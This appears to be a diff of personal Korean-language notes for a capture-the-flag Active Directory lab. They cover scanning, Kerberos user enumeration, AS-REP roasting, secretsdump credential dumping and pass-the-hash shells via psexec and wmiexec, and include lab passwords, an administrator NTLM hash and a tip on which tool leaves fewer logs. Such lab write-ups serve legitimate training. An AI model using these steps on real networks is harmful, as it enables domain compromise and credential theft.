@@ -1,10 +1,10 @@
-10.10.53.245
+10.10.107.58
 
 # nmap
 
-nmap -sV -sC -Pn -T4 --open -oN namp.scan.txt 10.10.53.245
+nmap -sV -sC -Pn -T4 --open -oN namp.scan.txt 10.10.107.58
 
-Nmap scan report for 10.10.53.245
+Nmap scan report for 10.10.107.58
 Host is up (0.29s latency).
 Not shown: 986 closed tcp ports (reset)
 PORT STATE SERVICE VERSION
@@ -51,7 +51,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 
-Nmap은 네트워크 스캐닝 도구로, 호스트와 네트워크 서비스에 대한 정보를 수집하는 데 사용됩니다. 제공된 Nmap 스캔 결과는 IP 주소 `10.10.53.245`에 대한 상세한 스캔 결과를 보여줍니다. 각 포트와 서비스에 대한 정보를 분석하면 다음과 같습니다:
+Nmap은 네트워크 스캐닝 도구로, 호스트와 네트워크 서비스에 대한 정보를 수집하는 데 사용됩니다. 제공된 Nmap 스캔 결과는 IP 주소 `10.10.107.58`에 대한 상세한 스캔 결과를 보여줍니다. 각 포트와 서비스에 대한 정보를 분석하면 다음과 같습니다:
 
 1. **53/tcp**: DNS 서비스 (Simple DNS Plus)가 열려 있습니다. DNS는 도메인 이름을 IP 주소로 변환하는 데 사용됩니다.
 
@@ -97,7 +97,7 @@ Nmap은 네트워크 스캐닝 도구로, 호스트와 네트워크 서비스에
 
 # /etc/hosts
 
-10.10.53.245 spookysec.local
+10.10.107.58 spookysec.local
 
 # enum4linux
 
@@ -117,53 +117,53 @@ sudo neo4j console
 # enum4linux
 
 (kali㉿vbox)-[~]
-└─$ sudo enum4linux -a 10.10.53.245
+└─$ sudo enum4linux -a 10.10.107.58
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 6 03:45:13 2025
 
 =========================================( Target Information )=========================================
 
-Target ........... 10.10.53.245
+Target ........... 10.10.107.58
 RID Range ........ 500-550,1000-1050
 Username ......... ''
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-============================( Enumerating Workgroup/Domain on 10.10.53.245 )============================
+============================( Enumerating Workgroup/Domain on 10.10.107.58 )============================
 
 [E] Can't find workgroup/domain
 
-================================( Nbtstat Information for 10.10.53.245 )================================
+================================( Nbtstat Information for 10.10.107.58 )================================
 
-Looking up status of 10.10.53.245
-No reply from 10.10.53.245
+Looking up status of 10.10.107.58
+No reply from 10.10.107.58
 
-===================================( Session Check on 10.10.53.245 )===================================
+===================================( Session Check on 10.10.107.58 )===================================
 
-[+] Server 10.10.53.245 allows sessions using username '', password ''
+[+] Server 10.10.107.58 allows sessions using username '', password ''
 
-================================( Getting domain SID for 10.10.53.245 )================================
+================================( Getting domain SID for 10.10.107.58 )================================
 
 Domain Name: THM-AD  
 Domain Sid: S-1-5-21-3591857110-2884097990-301047963
 
 [+] Host is part of a domain (not a workgroup)
 
-===================================( OS information on 10.10.53.245 )===================================
+===================================( OS information on 10.10.107.58 )===================================
 
 [E] Can't get OS info with smbclient
 
-[+] Got OS info for 10.10.53.245 from srvinfo:  
+[+] Got OS info for 10.10.107.58 from srvinfo:  
 do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
 
-=======================================( Users on 10.10.53.245 )=======================================
+=======================================( Users on 10.10.107.58 )=======================================
 
 [E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
 
 [E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
 
-=================================( Share Enumeration on 10.10.53.245 )=================================
+=================================( Share Enumeration on 10.10.107.58 )=================================
 
-do_connect: Connection to 10.10.53.245 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+do_connect: Connection to 10.10.107.58 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -171,17 +171,17 @@ do_connect: Connection to 10.10.53.245 failed (Error NT_STATUS_RESOURCE_NAME_NOT
 Reconnecting with SMB1 for workgroup listing.
 Unable to connect with SMB1 -- no workgroup available
 
-[+] Attempting to map shares on 10.10.53.245
+[+] Attempting to map shares on 10.10.107.58
 
-============================( Password Policy Information for 10.10.53.245 )============================
+============================( Password Policy Information for 10.10.107.58 )============================
 
 [E] Unexpected error from polenum:
 
-[+] Attaching to 10.10.53.245 using a NULL share
+[+] Attaching to 10.10.107.58 using a NULL share
 
 [+] Trying protocol 139/SMB...
 
-        [!] Protocol failed: Cannot request session (Called Name:10.10.53.245)
+        [!] Protocol failed: Cannot request session (Called Name:10.10.107.58)
 
 [+] Trying protocol 445/SMB...
 
@@ -189,7 +189,7 @@ Unable to connect with SMB1 -- no workgroup available
 
 [E] Failed to get password policy with rpcclient
 
-=======================================( Groups on 10.10.53.245 )=======================================
+=======================================( Groups on 10.10.107.58 )=======================================
 
 [+] Getting builtin groups:
 
@@ -203,7 +203,7 @@ Unable to connect with SMB1 -- no workgroup available
 
 [+] Getting domain group memberships:
 
-==================( Users on 10.10.53.245 via RID cycling (RIDS: 500-550,1000-1050) )==================
+==================( Users on 10.10.107.58 via RID cycling (RIDS: 500-550,1000-1050) )==================
 
 [I] Found new SID:  
 S-1-5-21-3591857110-2884097990-301047963
@@ -240,7 +240,7 @@ S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
 S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
 S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
 
-===============================( Getting printer info for 10.10.53.245 )===============================
+===============================( Getting printer info for 10.10.107.58 )===============================
 
 do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
 
@@ -291,7 +291,7 @@ d: 도메인 이름 (spookysec.local)
 o: 결과를 저장할 파일 이름 (found_users.txt)
 t: 스레드 수 (동시 요청 수, 기본값은 10)
 
-kerbrute userenum --dc 10.10.53.245 -d spookysec.local -t 100 userlist.txt
+kerbrute userenum --dc 10.10.107.58 -d spookysec.local -t 100 userlist.txt
 
     __             __               __
 
@@ -303,7 +303,7 @@ kerbrute userenum --dc 10.10.53.245 -d spookysec.local -t 100 userlist.txt
 Version: dev (n/a) - 07/06/25 - Ronnie Flathers @ropnop
 
 2025/07/06 06:55:59 > Using KDC(s):
-2025/07/06 06:55:59 > 10.10.53.245:88
+2025/07/06 06:55:59 > 10.10.107.58:88
 
 2025/07/06 06:55:59 > [+] VALID USERNAME: james@spookysec.local
 2025/07/06 06:56:00 > [+] svc-admin has no pre auth required. Dumping hash to crack offline:
@@ -355,8 +355,8 @@ cd impacket/examples
 
 # username 하나씩 넣어보면서 AS-REP Roasting 가능한지 확인
 
-python3 GetNPUsers.py spookysec.local/USERNAME -no-pass -dc-ip 10.10.53.245
-python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.53.245
+python3 GetNPUsers.py spookysec.local/USERNAME -no-pass -dc-ip 10.10.107.58
+python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.107.58
 
 # backup 계정도 보통 권한이 높은 경우가 많으므로 확인 필요
 
@@ -565,17 +565,17 @@ cd impacket
 
 - `deactivate` : 가상환경 나가기
 
-  10.10.53.245
+  10.10.107.58
 
 smbclient -L spookysec.local -U svc-admin%management2005
 smbclient //spookysec.local/SYSVOL -U backup%backup2517860
 
 ```bash
-python3 /impacket/examples/secretsdump.py -dc-ip 10.10.53.245 -target-ip 10.10.53.245 backup@spookysec.local:backup2517860
+python3 /impacket/examples/secretsdump.py -dc-ip 10.10.107.58 -target-ip 10.10.107.58 backup@spookysec.local:backup2517860
 
 
 ──(test)(root㉿docker-desktop)-[/impacket]
-└─# python3 /impacket/examples/secretsdump.py -dc-ip 10.10.53.245 -target-ip 10.10.53.245 backup@spookysec.local:backup2517860
+└─# python3 /impacket/examples/secretsdump.py -dc-ip 10.10.107.58 -target-ip 10.10.107.58 backup@spookysec.local:backup2517860
 /impacket/test/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
 import pkg_resources
 Impacket v0.13.0.dev0+20250707.152659.a60a1f17 - Copyright Fortra, LLC and its affiliated companies
@@ -666,10 +666,10 @@ ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
 
 ```bash
 # administrator 계정으로 바로 로그인 시도
-python3 /impacket/examples/psexec.py spookysec.local/administrator -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc -dc-ip 10.10.53.245
+python3 /impacket/examples/psexec.py spookysec.local/administrator -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc -dc-ip 10.10.107.58
 
 # evil-winrm 사용해서 하는 방법
-evil-winrm -i 10.10.53.245 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+evil-winrm -i 10.10.107.58 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 ```
 
 ```
@@ -682,26 +682,47 @@ evil-winrm -i 10.10.53.245 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 - /etc/hosts에 도메인-IP 매핑이 없거나 오타
 
 ```bash
-# 그냥 도메인 없이 ip로
-python3 /impacket/examples/psexec.py administrator@10.10.53.245 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+# psexec.py -> 풀 기능 쉘 연결 -> 로그 많이 남음 -> 포렌식에 잘 걸림
+python3 /impacket/examples/psexec.py administrator@10.10.107.58 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+
+# wmiexec.py -> 간이 쉘 연결 -> 로그 거의 없음 -> 연결 불안정
+python3 /impacket/examples/wmiexec.py administrator@10.10.107.58 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+
 ```
 
 ┌──(test)(root㉿docker-desktop)-[/impacket]
-└─# python3 /impacket/examples/psexec.py administrator@10.10.53.245 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+└─# python3 /impacket/examples/psexec.py administrator@10.10.107.58 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
 /impacket/test/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
 import pkg_resources
 Impacket v0.13.0.dev0+20250707.152659.a60a1f17 - Copyright Fortra, LLC and its affiliated companies
 
-[*] Requesting shares on 10.10.53.245.....
+[*] Requesting shares on 10.10.107.58.....
 [*] Found writable share ADMIN$
 [*] Uploading file alNSfNJr.exe
-[*] Opening SVCManager on 10.10.53.245.....
-[*] Creating service qVuD on 10.10.53.245.....
+[*] Opening SVCManager on 10.10.107.58.....
+[*] Creating service qVuD on 10.10.107.58.....
 [*] Starting service qVuD.....
 [!] Press help for extra shell commands
 Microsoft Windows [Version 10.0.17763.1490]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>
+C:\>
 
-# 시스템 탈환 성공
+# 시스템 침투 성공
+
+C:\>dir
+Volume in drive C has no label.
+Volume Serial Number is EEA6-70E8
+
+Directory of C:\
+
+04/04/2020 11:32 AM <DIR> inetpub
+09/17/2020 04:43 PM <DIR> PerfLogs
+04/04/2020 11:26 AM <DIR> Program Files
+09/15/2018 02:06 AM <DIR> Program Files (x86)
+04/04/2020 12:07 PM <DIR> Shares
+09/17/2020 04:03 PM <DIR> Users
+07/12/2025 05:56 PM <DIR> Windows
+0 File(s) 0 bytes
+7 Dir(s) 14,695,264,256 bytes free
